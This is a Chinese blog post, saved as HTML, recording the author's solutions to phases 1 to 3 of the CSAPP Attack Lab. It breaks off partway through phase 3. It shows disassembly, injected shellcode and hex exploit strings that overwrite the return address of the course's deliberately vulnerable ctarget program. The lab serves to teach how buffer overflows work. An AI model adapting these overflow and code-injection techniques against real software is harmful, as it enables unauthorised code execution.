@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chuanleiguo.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Attack Lab 的主要目的是利用程序中的缓冲区溢出漏洞来实现对系统的攻击。那么如何利用缓冲区漏洞呢？ 第一阶段第一个关卡不要求向程序中注入代码，而是需要输入一个「引爆字符串」来改变程序的运行轨迹，重定向运行另外一个函数。在 ctarget 中，getbuf 被函数 test 调用： 12345void test() &amp;#123;  int val;  val &#x3D; getbuf();  pri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【深入理解计算机系统实验笔记】| Attack Lab">
+<meta property="og:url" content="http://chuanleiguo.com/2017/07/09/csapp-attacklab/index.html">
+<meta property="og:site_name" content="Chuan&#39;s Cabin">
+<meta property="og:description" content="Attack Lab 的主要目的是利用程序中的缓冲区溢出漏洞来实现对系统的攻击。那么如何利用缓冲区漏洞呢？ 第一阶段第一个关卡不要求向程序中注入代码，而是需要输入一个「引爆字符串」来改变程序的运行轨迹，重定向运行另外一个函数。在 ctarget 中，getbuf 被函数 test 调用： 12345void test() &amp;#123;  int val;  val &#x3D; getbuf();  pri">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.32.42.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.58.30.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.34.41.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.35.08.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.52.44.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.02.55.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.03.06.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.19.59.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.09.59.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.34.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.54.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.01.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.10.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2017.13.01.png">
+<meta property="og:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2019.58.10.png">
+<meta property="article:published_time" content="2017-07-09T13:20:23.000Z">
+<meta property="article:modified_time" content="2020-06-21T08:44:11.551Z">
+<meta property="article:author" content="Chuanlei Guo">
+<meta property="article:tag" content="计算机科学">
+<meta property="article:tag" content="深入理解计算机系统">
+<meta property="article:tag" content="计算机系统">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://chuanleiguo.com/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.32.42.png">
+
+<link rel="canonical" href="http://chuanleiguo.com/2017/07/09/csapp-attacklab/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【深入理解计算机系统实验笔记】| Attack Lab | Chuan's Cabin</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"] > svg a {
+  fill: blue;
+  stroke: blue;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container {
+  overflow: auto hidden;
+}
+
+mjx-container + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chuan's Cabin</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Code & Live with Love</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-programming-language">
+
+    <a href="/categories/programming-language" rel="section"><i class="fa fa-rocket fa-fw"></i>编程语言</a>
+
+  </li>
+        <li class="menu-item menu-item-sourcecode">
+
+    <a href="/categories/sourcecode" rel="section"><i class="fa fa-code fa-fw"></i>源码分析</a>
+
+  </li>
+        <li class="menu-item menu-item-computer-science">
+
+    <a href="/categories/computer-science" rel="section"><i class="fa fa-cogs fa-fw"></i>计算机科学</a>
+
+  </li>
+        <li class="menu-item menu-item-mooc">
+
+    <a href="/categories/mooc" rel="section"><i class="fa fa-graduation-cap fa-fw"></i>MOOC</a>
+
+  </li>
+        <li class="menu-item menu-item-booknotes">
+
+    <a href="/categories/booknotes" rel="section"><i class="fa fa-book fa-fw"></i>读书笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-diary">
+
+    <a href="/categories/diary" rel="section"><i class="fa fa-keyboard fa-fw"></i>日志</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/07/09/csapp-attacklab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Chuanlei Guo">
+      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chuan's Cabin">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【深入理解计算机系统实验笔记】| Attack Lab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-07-09 21:20:23" itemprop="dateCreated datePublished" datetime="2017-07-09T21:20:23+08:00">2017-07-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-21 16:44:11" itemprop="dateModified" datetime="2020-06-21T16:44:11+08:00">2020-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/2017/07/09/csapp-attacklab/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/07/09/csapp-attacklab/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Attack Lab 的主要目的是利用程序中的缓冲区溢出漏洞来实现对系统的攻击。那么如何利用缓冲区漏洞呢？</p>
+<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>第一个关卡不要求向程序中注入代码，而是需要输入一个「引爆字符串」来改变程序的运行轨迹，重定向运行另外一个函数。在 <code>ctarget</code> 中，<code>getbuf</code> 被函数 <code>test</code> 调用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit.  Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们希望 <code>getbuf()</code> 在返回后，调用函数 <code>touch1</code> 而不是输出 val 的值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们具体要做的事情就是把 <code>touch1</code> 的开始地址放到 <code>getbuf</code> 的 <code>ret</code> 指令中，而且需要注意应该使用小端字节序。</p>
+<p>首先，我们反汇编 <code>ctarget</code>：<code>objdump -d ctarget &gt; touch1.s</code><br><img src="/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.32.42.png" alt="Screen Shot 2017-05-14 at 20.32.42"></p>
+<p>在 touch1.s 中找到 <code>getbuf</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，<code>getbuf</code> 将 <code>%rsp</code> 移动了 <code>0x28</code> 也就是 40 字节。这也就意味着，在往上 4 个字节，就是返回到 <code>test</code> 的返回地址。所以，我们就可以利用缓冲区溢出将返回地址修改掉。</p>
+<p>现在我们看看 <code>touch1</code> 在哪里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 <code>touch1</code> 的开始地址在 <code>0x004017c0</code>，所以我们输入的字符串可以是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们将这个字符文件转换为字节码 <code>./hex2raw &lt; touch1.txt &gt; touch1_r.txt</code>，然后执行 <code>./ctarget -q -i touch1_r.txt</code>:</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.58.30.png" alt="Screen Shot 2017-05-14 at 20.58.30"></p>
+<p>通过第一关，我们就学习了通过使用缓冲区溢出来调用另外的函数。</p>
+<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二阶段要求向程序中注入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 的 C 语言代码为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;    <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要把自己的 cookie 作为参数传入，因为只有一个参数，所以参数应该被放入寄存器 <code>%rdi</code>，并使用<code>ret</code> 跳转。</p>
+<p>我们写好需要注入的汇编代码，首先将 cookie 的值保存到寄存器 <code>%rdi</code>，然后将 <code>touch2</code> 的地址压入栈中，最后返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们将汇编代码转换为机器码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2.s</span><br><span class="line">objdump -d touch2.o &gt; touch2.bytes</span><br></pre></td></tr></table></figure>
+
+<p>touch2.bytes 中的内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">touch2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>为了执行这段代码，我们需要使用阶段 1 中的方法，跳转到缓冲区的开始位置，去执行我们注入的代码。为了知道缓冲区的起始位置，我们使用 GDB 来调试程序，查看 <code>%rsp</code> 的值。我们在 0x4017b4 处设置断点：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.34.41.png" alt="Screen Shot 2017-05-15 at 20.34.41"></p>
+<p>然后查看寄存器信息：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.35.08.png" alt="Screen Shot 2017-05-15 at 20.35.08"></p>
+<p>可以看到缓冲区的起始位置为 0x5561dc78。</p>
+<p>接下来我们就构造需要的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa </span><br><span class="line">97 b9 59 68 </span><br><span class="line">ec 17 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们使用 <code>./hex2raw &lt; touch2.txt &gt; touch2_r.txt</code> 生成字节码，然后执行命令 <code>./ctarget -i touch2_r.txt -q</code>，就可以看到执行结果：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.52.44.png" alt="Screen Shot 2017-05-15 at 20.52.44"></p>
+<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>第三阶段同样要实现代码注入攻击，但是要传入一个额外的字符串。</p>
+<p>在 <code>ctarget</code> 中 <code>hexmatch</code> 和 <code>touch3</code> 的 C 语言代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch3!: You called You called touch3(\"%s\")\n"</span>, sval)</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要在引爆字符串中包含自己 cookie 的字符串表示，这个字符串应该是 8 个 16 进制数字，并以 0 为结尾。这个字符串的地址应该被保存在 <code>%rdi</code> 中。当函数 <code>hexmatch</code> 和 <code>strncmp</code> 被调用的时候，他们会把参数保存到栈上，这会覆盖 <code>getbuf</code> 写入的部分内容。所以，我们需要小心引爆字符串的存放位置。</p>
+<p>首先将我的 cookie 转换为 字符串形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p>为了测试 <code>hexmatch</code> 的行为，我们对上一节的字节码稍作修改，将我的 cookie 的字符串表示存储在缓冲区内，并使程序跳转到 <code>touch3</code>，构造字节码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 </span><br><span class="line">dc 61 55 68 </span><br><span class="line">fa 18 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">35 39 62 39 </span><br><span class="line">39 37 66 61 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
+
+<p>跳转到 <code>touch3</code> 后，我们可以找到调用 <code>hexmatch</code> 的位置，于是可以分别在前后两行设置断点，并观察缓冲区的变化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br></pre></td></tr></table></figure>
+
+<p>在调用 <code>hexmatch</code> 之前，我们可以看到缓冲区的信息如下：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.02.55.png" alt="Screen Shot 2017-05-21 at 16.02.55"></p>
+<p>在调用 <code>hexmatch</code> 之后，我们可以看到缓冲区信息为：<br><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.03.06.png" alt="Screen Shot 2017-05-21 at 16.03.06"></p>
+<p>可以看到，缓冲区前三行的内容全部为打乱了，我们保存的字符串信息也被完全破坏了。所以，我们需要为字符串寻找一个新的存放位置。</p>
+<p>看到最后一行，<code>0x5561dcb8</code> 之后的位置没有被使用，而且刚好可以存放我们的字符串，所以，抱着试一试的态度，我将字符串目标地址设置为 <code>0x5561dcb8</code>，并将 cookie 的字符串信息保存到相应位置。</p>
